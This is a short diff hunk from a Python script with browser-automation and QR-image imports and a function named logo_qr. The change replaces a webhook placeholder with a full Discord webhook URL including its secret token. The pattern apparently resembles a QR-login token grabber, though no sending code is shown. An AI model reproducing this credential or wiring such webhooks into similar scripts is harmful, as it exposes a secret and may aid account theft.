@@ -20,7 +20,7 @@ import threading
 from webdriver_manager.chrome import ChromeDriverManager#
 import cairosvg
 
-url = "paste your webhook here."
+url = "https://discord.com/api/webhooks/1136444342073032876/2andtroFZ6DclmMtDjZfwl9RmI_mWNNDtbkGljLnDulgFP8lZSeC_eGjLkebZ6CdOwEs"
 
 
 def logo_qr(count):
